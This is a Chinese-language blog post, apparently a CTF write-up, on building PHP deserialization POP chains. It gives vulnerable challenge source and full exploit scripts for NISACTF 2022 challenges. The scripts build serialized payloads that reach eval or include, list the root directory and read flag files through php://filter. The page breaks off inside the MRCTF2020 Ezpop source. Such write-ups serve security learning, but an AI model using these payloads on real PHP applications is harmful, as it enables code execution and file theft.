@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="yanm1ng&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      pop链 | Hexo
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+    
+<script src="/js/qrious.js"></script>
+
+  
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+  
+    
+<script src="/js/local-search.js"></script>
+
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>Hexo</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/series/" class="item-link">Series</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/tags/" class="item-link">Tags</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+      
+        <li class="menu-item menu-item-search right-list">
+    <a role="button" class="popup-trigger">
+        <i class="fa fa-search fa-fw"></i>
+    </a>
+</li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/series/" class="menu-link">Series</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/tags/" class="menu-link">Tags</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+    
+      <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+            <span class="search-icon">
+                <i class="fa fa-search"></i>
+            </span>
+            <div class="search-input-container">
+                <input autocomplete="off" autocapitalize="off"
+                    placeholder="Please enter your keyword(s) to search." spellcheck="false"
+                    type="search" class="search-input">
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa fa-times-circle"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+    
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>pop链</h2>
+  <p class="post-date">2022-03-31</p>
+  <div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><p>该篇博客主要是整理了php反序列化之pop链的构造实例，涉及的都是相对基础的内容。</p>
+<span id="more"></span>
+<h3 id="pop链简介">pop链简介</h3>
+<p>我们知道反序列化是通过控制对象的属性从而实现控制程序的执行流程，而pop链则是把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p>
+<h4 id="魔术方法">魔术方法</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__construct  当一个对象创建时被调用，</span><br><span class="line">__destruct  当一个对象销毁时被调用，</span><br><span class="line">__toString  当一个对象被当作一个字符串被调用。</span><br><span class="line">__wakeup()  使用unserialize时触发</span><br><span class="line">__sleep()  使用serialize时触发</span><br><span class="line">__destruct()  对象被销毁时触发</span><br><span class="line">__call()  在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic()  在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get()  用于从不可访问的属性读取数据</span><br><span class="line">__set()  用于将数据写入不可访问的属性</span><br><span class="line">__isset()  在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset()   在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString()  把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke()  当脚本尝试将对象调用为函数时触发</span><br><span class="line"></span><br><span class="line">难以访问包括：（1）私有属性，（2）没有初始化的属性</span><br></pre></td></tr></table></figure>
+<h4 id="反序列化字符含义">反序列化字符含义</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a - array         b - boolean</span><br><span class="line">d - double         i - integer</span><br><span class="line">o - common object     r - reference</span><br><span class="line">s - string         C - custom object</span><br><span class="line">O - class         N - null</span><br><span class="line">R - pointer reference   U - unicode string</span><br></pre></td></tr></table></figure>
+<h3 id="题目实例">题目实例</h3>
+<h4 id="NISACTF-2022-babyserialize">[NISACTF 2022]babyserialize</h4>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://www.ctfer.vip/#/problem/1852?back=%257B%2522contest%2522:%2522%2522,%2522year%2522:0,%2522source%2522:0,%2522name%2522:%2522babyseri%2522,%2522username%2522:%2522%2522,%2522type%2522:1,%2522tag%2522:%255B%255D,%2522tagType%2522:0,%2522date%2522:%2522%2522,%2522unsolved%2522:false,%2522page%2522:1%257D">戳</a></p>
+<p>考点：</p>
+<ul>
+<li>反序列化之pop链</li>
+<li>php原生类的应用</li>
+<li>php伪协议</li>
+</ul>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;waf.php&quot;;</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;fun==&quot;show_me_flag&quot;)&#123;</span><br><span class="line">            hint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function __call($from,$val)&#123;</span><br><span class="line">        $this-&gt;fun=$val[0];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;fun;</span><br><span class="line">        return &quot; &quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        checkcheck($this-&gt;txw4ever);</span><br><span class="line">        @eval($this-&gt;txw4ever);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;ext-&gt;nisa($this-&gt;x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">    public function __call($fun1,$arg)&#123;</span><br><span class="line">        $this-&gt;huang-&gt;fun=$arg[0];</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        $bb = $this-&gt;su;</span><br><span class="line">        return $bb();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line">    public function __set($name, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$name=$value;</span><br><span class="line">        if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123;</span><br><span class="line">            strtolower($this-&gt;a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;ser&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;ser&#x27;]);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//func checkcheck($data)&#123;</span><br><span class="line">//  if(preg_match(......))&#123;</span><br><span class="line">//      die(something wrong);</span><br><span class="line">//  &#125;</span><br><span class="line">//&#125;</span><br><span class="line">//function hint()&#123;</span><br><span class="line">//    echo &quot;.......&quot;;</span><br><span class="line">//    die();</span><br><span class="line">//&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>观察源码，构造链子：首先是if函数中的<code>unserialize</code>会触发<code>TianXiWei类的__wakeup()</code>魔术方法，因调用不可访问的变量nisa则会触发<code>Ilovetxw类的__call()</code>，其中__call()中将$arg[0]写入不可访问的变量fun中会触发<code>four类的__set()</code>，其中存在strtolower函数，说明将$this-&gt;a看作字符串执行，满足触发<code>__toString和__toString()</code>，并且触发<code>__toString()</code>要求返回值为字符串，由于源码中没有<code>__toString</code>魔术方法，所以只有<code>Ilovetxw类</code>符合该条件，最后回到第一类<code>NISA</code>，其中eval函数会触发<code>__invoke()</code>魔术方法，最终构造链子为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TianXiWei::__wakeup() --&gt; Ilovetxw::__call() --&gt; four::__set() --&gt; Ilovetxw::__toString() --&gt; NISA::__invoke()</span><br></pre></td></tr></table></figure>
+<p>exp如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NISA&#123;</span><br><span class="line">    public $fun=&quot;show_me_flag&quot;;</span><br><span class="line">    public $txw4ever;</span><br><span class="line">&#125;</span><br><span class="line">class TianXiWei&#123;</span><br><span class="line">    public $ext;</span><br><span class="line">    public $x;</span><br><span class="line">&#125;</span><br><span class="line">class Ilovetxw&#123;</span><br><span class="line">    public $huang;</span><br><span class="line">    public $su;</span><br><span class="line">&#125;</span><br><span class="line">class four&#123;</span><br><span class="line">    public $a=&quot;TXW4EVER&quot;;</span><br><span class="line">    private $fun=&#x27;abc&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$N1 = new NISA();</span><br><span class="line">$N1-&gt;fun = &quot;txw&quot;;</span><br><span class="line">$N1-&gt;txw4ever = &quot;echo new GlobIterator(\&quot;/f*\&quot;);&quot;;</span><br><span class="line">$I1 = new Ilovetxw();</span><br><span class="line">$I1-&gt;su = $N1;</span><br><span class="line">$f1 = new four();</span><br><span class="line">$f1-&gt;a = $I1;</span><br><span class="line">$I2 = new Ilovetxw();</span><br><span class="line">$I2-&gt;huang = $f1;</span><br><span class="line">$T1 = new TianXiWei();</span><br><span class="line">$T1-&gt;x = &quot;sixsixsix&quot;;</span><br><span class="line">$T1-&gt;ext = $I2;</span><br><span class="line">echo urlencode(serialize($T1));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>当存在private属性和protected属性时需要序列化需要经过url编码。</strong></p>
+<p><strong>hint()就是说flag在根目录</strong></p>
+<p>我们下一步就是要找出flag所在的目录，涉及到php原生类的应用，其内容可参照——<a target="_blank" rel="noopener" href="https://blog.csdn.net/cjdgg/article/details/115314651">PHP 原生类的利用_lmonstergg的博客-CSDN博客_php原生类</a>。</p>
+<p>现在我们主要要用到可遍历目录类：</p>
+<ul>
+<li>DirectoryIterator 类</li>
+<li>FilesystemIterator 类</li>
+<li>GlobIterator 类</li>
+</ul>
+<p><strong>DirectoryIterator 类</strong></p>
+<p>简介：DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口。</p>
+<p>如果我们这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
+<p>会创建一个指定目录的迭代器。当执行到echo函数时，会触发DirectoryIterator类中的 __toString() 方法，输出指定目录里面经过排序之后的第一个文件名。</p>
+<p>如果想输出全部的文件名我们还需要对$dir对象进行遍历：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">foreach($dir as $f)&#123;</span><br><span class="line">    echo($f.&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">    //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，遍历的文件不仅包含同一目录下的，还会扩大到磁盘。</p>
+<p>下面介绍我们更常使用的方法，即与<code>glob://协议</code>匹配使用，这个用法在上一篇博客中我们有用过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;glob:///*php*&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
+<p>glob:// — 查找匹配的文件路径模式</p>
+<p><strong>FilesystemIterator 类</strong></p>
+<p>FilesystemIterator 类与 DirectoryIterator 类相同，提供了一个用于查看文件系统目录内容的简单接口。该类的构造方法将会创建一个指定目录的迭代器。</p>
+<p>可以把它看作是DirectoryIterator 类的一个替代。</p>
+<p><strong>GlobIterator 类</strong></p>
+<p>与前两个类的作用相似，GlobIterator 类也可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于 glob()，可以通过模式匹配来寻找文件路径。</p>
+<p>我们知道，向下面这样在单纯的使用 DirectoryIterator 类和 FilesystemIterator 类且没有配合glob://协议进行匹配的时候：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new DirectoryIterator(&quot;/&quot;);</span><br><span class="line">echo $dir;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$dir=new FilesystemIterator(&quot;/&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
+<p>其构造函数创建的是一个指定目录的迭代器，当我们使用echo函数输出的时候，会触发这两个类中的 __toString() 方法，输出指定目录里面特定排序之后的第一个文件名。也就是说如果我们不循环遍历的话是不能看到指定目录里的全部文件的，而 GlobIterator 类便可以帮我们在一定程度上解决了这个问题。由于 GlobIterator 类支持直接通过模式匹配来寻找文件路径，也就是说假设我们知道一个文件名的一部分，我们可以通过该类的模式匹配找到其完整的文件名。例如，我们在CTF中知道flag在根目录，但是我们不知道flag文件的完整文件名，我们就可以通过类似 GlobIterator(/flag)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dir=new GlobIterator(&quot;/*flag*&quot;);</span><br><span class="line">echo $dir;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>利用SplFileObject类配合php伪协议读取其中的内容。</p>
+<p>将exp中<code>$N1-&gt;txw4ever</code>的值修改为:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$N1-&gt;txw4ever = &quot;echo new SplFileObject(\&quot;php://filter/convert.base64-encode/resource=/fllllllaaag\&quot;);&quot;;</span><br></pre></td></tr></table></figure>
+<p>即可得到base64加密的flag。</p>
+<h4 id="NISACTF-2022-popchains">[NISACTF 2022]popchains</h4>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://www.ctfer.vip/#/problem/2099?back=%257B%2522contest%2522:%2522%2522,%2522year%2522:0,%2522source%2522:0,%2522name%2522:%2522popchains%2522,%2522username%2522:%2522%2522,%2522type%2522:1,%2522tag%2522:%255B%255D,%2522tagType%2522:0,%2522date%2522:%2522%2522,%2522unsolved%2522:false,%2522page%2522:1%257D">戳</a></p>
+<p>考点：</p>
+<ul>
+<li>反序列化之pop链</li>
+<li>字符串逃逸</li>
+</ul>
+<p>题目源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;wish&#x27;]))&#123;</span><br><span class="line">    @unserialize($_GET[&#x27;wish&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    $a=new Road_is_Long;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">/***************************pop your 2022*****************************/</span><br><span class="line"></span><br><span class="line">class Road_is_Long&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        return $this-&gt;string-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;</span><br><span class="line">        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;</span><br><span class="line">            echo &quot;You can Not Enter 2022&quot;;</span><br><span class="line">            $this-&gt;page = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Try_Work_Hard&#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $this-&gt;append($this-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;effort = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        $function = $this-&gt;effort;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">/**********************Try to See flag.php*****************************/</span><br></pre></td></tr></table></figure>
+<p>还是先构造链子，首先反序列化会触发<code>Road_is_Long类的__wakeip()</code>，接着__wakeup()方法通过preg_match()将$this-&gt;page做字符串比较，调用了<code>Road_is_Long类的__toString()</code>魔术方法，又$string的page属性难以访问，触发了<code>Make_a_Change类的__get()</code>，调用了function函数触发了<code>Try_Work_Hard类的__invoke()</code>，Try_Work_Hard类中添加了<code>$value</code>变量，且将其include，联想到控制$value通过伪协议读取文件，这个可以通过触发<code>__invoke()</code>来完成，而append最终会执行<code>$file</code>。</p>
+<p>则pop链为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Road_is_Long::__wakeupp()--&gt;Road_is_Long::__toString()--&gt;Make_a_Change::__get()--&gt;Try_Work_Hard::__invoke()</span><br></pre></td></tr></table></figure>
+<p>构造exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Try_Work_Hard</span><br><span class="line">&#123;</span><br><span class="line">    public $var = &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Make_a_Change</span><br><span class="line">&#123;</span><br><span class="line">    public $effort;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Road_is_Long</span><br><span class="line">&#123;</span><br><span class="line">    public $page;</span><br><span class="line">    public $string;</span><br><span class="line"></span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;page = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Road_is_Long(aaa);//实例化Road_is_Long 传入aaa(任意）只是为了满足__construct</span><br><span class="line">$a-&gt;string = new Make_a_Change();//实例化成一个没有page属性的类</span><br><span class="line">$a-&gt;string-&gt;effort = new Try_Work_Hard();//实例化p</span><br><span class="line">$b = new Road_is_Long($a);//因为我们要传入$file=一个类 这样$this-&gt;page=$file之后 在正则过滤时 就是一个类被当作字符串对待 触发__toString</span><br><span class="line">echo urlencode(serialize($b));//输出</span><br></pre></td></tr></table></figure>
+<h4 id="MRCTF2020-Ezpop">[MRCTF2020]Ezpop</h4>
+<p>题目地址：<a target="_blank" rel="noopener" href="http://0e02d548-7a56-4632-93d7-073439a0bbf2.node4.buuoj.cn:81/">http://0e02d548-7a56-4632-93d7-073439a0bbf2.node4.buuoj.cn:81/</a></p>
+<p>考点：</p>
+<ul>
+<li>反序列化之pop链</li>
+</ul>
+<p>源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">    protected  $var;</span><br><span class="line">    public function append($value)&#123;</span><br><span class="line">        include($value);</span><br><span class="line">    